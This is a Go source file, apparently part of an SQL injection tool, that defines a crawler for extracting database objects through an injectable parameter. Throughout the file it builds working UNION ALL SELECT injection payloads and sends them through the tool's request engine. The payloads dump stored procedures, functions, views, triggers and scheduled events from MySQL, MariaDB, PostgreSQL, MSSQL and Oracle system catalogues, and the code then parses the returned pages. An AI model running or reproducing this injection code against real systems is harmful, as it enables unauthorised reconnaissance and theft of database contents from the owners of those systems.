package crawl

import (
	"fmt"
	"strings"
	"hackit/sqli/go/utils"
)

// ProcCrawler extracts stored procedures, functions, triggers, and events
type ProcCrawler struct {
	engine EngineInterface
	log    *utils.Logger
}

func NewProcCrawler(e EngineInterface) *ProcCrawler {
	return &ProcCrawler{engine: e, log: e.GetLogger()}
}

// ExtractProcedures extracts all stored procedures and functions
func (pc *ProcCrawler) ExtractProcedures(param, dbms, database string) []StoredProcInfo {
	var procs []StoredProcInfo

	switch {
	case strings.Contains(dbms, "MySQL"), strings.Contains(dbms, "MariaDB"):
		procs = pc.extractMySQLProcs(param, database)
	case strings.Contains(dbms, "PostgreSQL"):
		procs = pc.extractPostgresProcs(param, database)
	case strings.Contains(dbms, "MSSQL"):
		procs = pc.extractMSSQLProcs(param, database)
	case strings.Contains(dbms, "Oracle"):
		procs = pc.extractOracleProcs(param, database)
	}

	return procs
}

// ExtractViews extracts all view definitions
func (pc *ProcCrawler) ExtractViews(param, dbms, database string) []ViewInfo {
	var views []ViewInfo

	var query string
	switch {
	case strings.Contains(dbms, "MySQL"), strings.Contains(dbms, "MariaDB"):
		query = fmt.Sprintf("SELECT TABLE_NAME, VIEW_DEFINITION, IS_UPDATABLE FROM INFORMATION_SCHEMA.VIEWS WHERE TABLE_SCHEMA='%s'", database)
	case strings.Contains(dbms, "PostgreSQL"):
		query = fmt.Sprintf("SELECT viewname, definition, 'YES' FROM pg_catalog.pg_views WHERE schemaname='public'")
	case strings.Contains(dbms, "MSSQL"):
		query = fmt.Sprintf("SELECT v.name, m.definition, 'YES' FROM sys.views v JOIN sys.sql_modules m ON v.object_id=m.object_id WHERE (SELECT SCHEMA_NAME(v.schema_id))='dbo'")
	default:
		return views
	}

	payload := fmt.Sprintf("' UNION ALL SELECT %s-- -", query)
	body, _, _, err := pc.engine.Request(payload, param)
	if err != nil {
		return views
	}

	lines := strings.Split(body, "\n")
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if len(line) == 0 || strings.HasPrefix(line, "<") || strings.HasPrefix(line, "<!") {
			continue
		}
		parts := strings.Split(line, "\t")
		if len(parts) < 2 {
			parts = strings.Split(line, ",")
		}
		if len(parts) >= 2 {
			view := ViewInfo{
				Name:       strings.Trim(parts[0], "'\" "),
				Definition: strings.Trim(parts[1], "'\" "),
			}
			if len(parts) >= 3 {
				view.IsUpdatable = strings.ToUpper(strings.Trim(parts[2], "'\" ")) == "YES"
			}
			views = append(views, view)
		}
	}

	return views
}

func (pc *ProcCrawler) extractMySQLProcs(param, database string) []StoredProcInfo {
	query := fmt.Sprintf("SELECT ROUTINE_NAME, ROUTINE_TYPE, DTD_IDENTIFIER, ROUTINE_DEFINITION FROM INFORMATION_SCHEMA.ROUTINES WHERE ROUTINE_SCHEMA='%s'", database)
	payload := fmt.Sprintf("' UNION ALL SELECT %s-- -", query)
	body, _, _, err := pc.engine.Request(payload, param)
	if err != nil {
		return nil
	}

	var procs []StoredProcInfo
	lines := strings.Split(body, "\n")
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if len(line) == 0 || strings.HasPrefix(line, "<") {
			continue
		}
		parts := strings.Split(line, "\t")
		if len(parts) < 2 {
			parts = strings.Split(line, ",")
		}
		if len(parts) >= 4 {
			proc := StoredProcInfo{
				Name:       strings.Trim(parts[0], "'\" "),
				Type:       strings.Trim(parts[1], "'\" "),
				Returns:    strings.Trim(parts[2], "'\" "),
				Definition: strings.Trim(parts[3], "'\" "),
			}
			procs = append(procs, proc)
		}
	}

	return procs
}

func (pc *ProcCrawler) extractPostgresProcs(param, database string) []StoredProcInfo {
	query := "SELECT proname, 'FUNCTION', pg_get_function_result(p.oid), pg_get_functiondef(p.oid) FROM pg_proc p JOIN pg_namespace n ON p.pronamespace=n.oid WHERE n.nspname='public'"
	payload := fmt.Sprintf("' UNION ALL SELECT %s-- -", query)
	body, _, _, err := pc.engine.Request(payload, param)
	if err != nil {
		return nil
	}

	var procs []StoredProcInfo
	lines := strings.Split(body, "\n")
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if len(line) == 0 || strings.HasPrefix(line, "<") {
			continue
		}
		parts := strings.Split(line, "\t")
		if len(parts) < 2 {
			parts = strings.Split(line, ",")
		}
		if len(parts) >= 4 {
			procs = append(procs, StoredProcInfo{
				Name:       strings.Trim(parts[0], "'\" "),
				Type:       strings.Trim(parts[1], "'\" "),
				Returns:    strings.Trim(parts[2], "'\" "),
				Definition: strings.Trim(parts[3], "'\" "),
			})
		}
	}
	return procs
}

func (pc *ProcCrawler) extractMSSQLProcs(param, database string) []StoredProcInfo {
	query := fmt.Sprintf("SELECT p.name, 'PROCEDURE', '', m.definition FROM [%s].sys.procedures p JOIN [%s].sys.sql_modules m ON p.object_id=m.object_id", database, database)
	payload := fmt.Sprintf("' UNION ALL SELECT %s-- -", query)
	body, _, _, err := pc.engine.Request(payload, param)
	if err != nil {
		return nil
	}

	var procs []StoredProcInfo
	lines := strings.Split(body, "\n")
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if len(line) == 0 || strings.HasPrefix(line, "<") {
			continue
		}
		parts := strings.Split(line, "\t")
		if len(parts) < 2 {
			parts = strings.Split(line, ",")
		}
		if len(parts) >= 4 {
			procs = append(procs, StoredProcInfo{
				Name:       strings.Trim(parts[0], "'\" "),
				Type:       strings.Trim(parts[1], "'\" "),
				Definition: strings.Trim(parts[3], "'\" "),
			})
		}
	}
	return procs
}

func (pc *ProcCrawler) extractOracleProcs(param, database string) []StoredProcInfo {
	query := fmt.Sprintf("SELECT OBJECT_NAME, OBJECT_TYPE, '', '' FROM ALL_OBJECTS WHERE OWNER='%s' AND OBJECT_TYPE IN ('PROCEDURE','FUNCTION','PACKAGE')", database)
	payload := fmt.Sprintf("' UNION ALL SELECT %s-- -", query)
	body, _, _, err := pc.engine.Request(payload, param)
	if err != nil {
		return nil
	}

	var procs []StoredProcInfo
	lines := strings.Split(body, "\n")
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if len(line) == 0 || strings.HasPrefix(line, "<") {
			continue
		}
		parts := strings.Split(line, "\t")
		if len(parts) < 2 {
			parts = strings.Split(line, ",")
		}
		if len(parts) >= 2 {
			procs = append(procs, StoredProcInfo{
				Name: strings.Trim(parts[0], "'\" "),
				Type: strings.Trim(parts[1], "'\" "),
			})
		}
	}
	return procs
}

// ExtractTriggers extracts all triggers
func (pc *ProcCrawler) ExtractTriggers(param, dbms, database string) []map[string]string {
	var triggers []map[string]string

	var query string
	switch {
	case strings.Contains(dbms, "MySQL"), strings.Contains(dbms, "MariaDB"):
		query = fmt.Sprintf("SELECT TRIGGER_NAME, EVENT_MANIPULATION, EVENT_OBJECT_TABLE, ACTION_TIMING, ACTION_STATEMENT FROM INFORMATION_SCHEMA.TRIGGERS WHERE TRIGGER_SCHEMA='%s'", database)
	default:
		return triggers
	}

	payload := fmt.Sprintf("' UNION ALL SELECT %s-- -", query)
	body, _, _, err := pc.engine.Request(payload, param)
	if err != nil {
		return triggers
	}

	lines := strings.Split(body, "\n")
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if len(line) == 0 || strings.HasPrefix(line, "<") {
			continue
		}
		parts := strings.Split(line, "\t")
		if len(parts) < 2 {
			parts = strings.Split(line, ",")
		}
		if len(parts) >= 5 {
			trig := map[string]string{
				"name":      strings.Trim(parts[0], "'\" "),
				"event":     strings.Trim(parts[1], "'\" "),
				"table":     strings.Trim(parts[2], "'\" "),
				"timing":    strings.Trim(parts[3], "'\" "),
				"statement": strings.Trim(parts[4], "'\" "),
			}
			triggers = append(triggers, trig)
		}
	}

	return triggers
}

// ExtractEvents extracts events (MySQL only)
func (pc *ProcCrawler) ExtractEvents(param, dbms, database string) []map[string]string {
	if !strings.Contains(dbms, "MySQL") && !strings.Contains(dbms, "MariaDB") {
		return nil
	}

	query := fmt.Sprintf("SELECT EVENT_NAME, EVENT_TYPE, EXECUTE_AT, INTERVAL_VALUE, INTERVAL_FIELD, EVENT_DEFINITION, STATUS FROM INFORMATION_SCHEMA.EVENTS WHERE EVENT_SCHEMA='%s'", database)
	payload := fmt.Sprintf("' UNION ALL SELECT %s-- -", query)
	body, _, _, err := pc.engine.Request(payload, param)
	if err != nil {
		return nil
	}

	var events []map[string]string
	lines := strings.Split(body, "\n")
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if len(line) == 0 || strings.HasPrefix(line, "<") {
			continue
		}
		parts := strings.Split(line, "\t")
		if len(parts) < 2 {
			parts = strings.Split(line, ",")
		}
		if len(parts) >= 7 {
			evt := map[string]string{
				"name":     strings.Trim(parts[0], "'\" "),
				"type":     strings.Trim(parts[1], "'\" "),
				"execute":  strings.Trim(parts[2], "'\" "),
				"interval": strings.Trim(parts[3], "'\" ") + " " + strings.Trim(parts[4], "'\" "),
				"def":      strings.Trim(parts[5], "'\" "),
				"status":   strings.Trim(parts[6], "'\" "),
			}
			events = append(events, evt)
		}
	}
	return events
}
